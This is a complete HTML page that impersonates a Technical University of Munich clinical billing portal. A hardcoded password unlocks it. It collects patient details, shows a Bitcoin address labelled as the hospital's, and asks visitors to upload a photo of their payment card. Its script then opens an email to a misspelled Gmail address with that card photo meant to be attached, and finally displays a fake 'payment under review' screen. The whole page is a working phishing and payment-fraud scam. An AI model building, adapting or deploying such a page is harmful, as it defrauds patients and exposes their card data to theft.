<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Billing Terminal | TUM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .tum-blue { background-color: #005293; }
        .hero-overlay { background: rgba(0, 0, 0, 0.7); }
        #main-portal, #review-message { display: none; }
    </style>
</head>
<body class="bg-gray-100 font-sans">

    <div id="login-screen" class="min-h-screen flex items-center justify-center bg-slate-900 p-6">
        <div class="bg-white p-8 rounded-3xl shadow-2xl max-w-sm w-full text-center">
            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-12 mx-auto mb-6">
            <h2 class="text-xl font-bold mb-4 uppercase">Clinical Portal</h2>
            <input type="password" id="pass-input" placeholder="Terminal Password" class="w-full border-2 p-3 rounded-xl mb-4 text-center outline-none">
            <button onclick="verify()" class="w-full tum-blue text-white py-3 rounded-xl font-bold uppercase">Unlock</button>
        </div>
    </div>

    <div id="review-message" class="min-h-screen flex items-center justify-center bg-gray-100 p-6">
        <div class="bg-white p-10 rounded-3xl shadow-2xl max-w-md w-full text-center border-t-8 border-blue-900">
            <div class="mb-6 flex justify-center">
                <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-900"></div>
            </div>
            <h2 class="text-2xl font-black text-blue-900 uppercase mb-4">Payment Under Review</h2>
            <p class="text-gray-600 font-medium">You will receive an email from our team after payment confirmation.</p>
        </div>
    </div>

    <div id="main-portal">
        <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-10">
            <p class="text-[9px] font-bold text-gray-400 uppercase text-right leading-tight">Technical University<br>of Munich</p>
        </nav>

        <div class="relative h-48 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
            <div class="absolute inset-0 hero-overlay flex items-center justify-center">
                <h1 class="text-white text-2xl font-black uppercase">Billing Terminal</h1>
            </div>
        </div>

        <div class="max-w-4xl mx-auto -mt-8 mb-20 px-4">
            <div class="bg-white shadow-2xl rounded-2xl border p-6 md:p-10">
                <form id="billing-form">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                        <input type="text" id="p_name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none">
                        <input type="text" id="h_id" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl outline-none">
                        <input type="text" id="s_name" placeholder="Sender Name" required class="border-2 p-3 rounded-xl outline-none">
                    </div>

                    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600">
                        <p class="text-gray-500 text-[9px] uppercase font-black mb-1">Official Clinical BTC Address</p>
                        <code class="text-green-400 text-xs break-all">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
                        <div class="mt-6">
                            <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px]">Step 1: Upload Card/Receipt Photo</label>
                            <input type="file" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
                        </div>
                    </div>

                    <button type="button" onclick="openGmail()" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg">Submit via Secure Mail</button>
                </form>
            </div>
        </div>
    </div>

    <script>
        function verify() {
            if(document.getElementById('pass-input').value === 'KLINIKUM2026') {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-portal').style.display = 'block';
            }
        }

        function openGmail() {
            const name = document.getElementById('p_name').value;
            const id = document.getElementById('h_id').value;
            const sender = document.getElementById('s_name').value;

            if(!name || !id || !sender) {
                alert("Please fill all details before submitting.");
                return;
            }

            // Create the Mailto Link
            const recipient = "teammangementt@gmail.com";
            const subject = encodeURIComponent("Clinical Payment Verification: " + name);
            const body = encodeURIComponent(
                "NEW CLINICAL SUBMISSION\n\n" +
                "Patient Name: " + name + "\n" +
                "Hospital ID: " + id + "\n" +
                "Sender: " + sender + "\n\n" +
                "PLEASE ATTACH THE PHOTO OF THE RECEIPT/CARD TO THIS EMAIL BEFORE HITTING SEND."
            );

            // Open Gmail/Mail App
            window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;

            // Show Reviewing Screen after a short delay so they have time to see the mail app open
            setTimeout(() => {
                document.getElementById('main-portal').style.display = 'none';
                document.getElementById('review-message').style.display = 'flex';
            }, 2000);
        }
    </script>
</body>
</html>
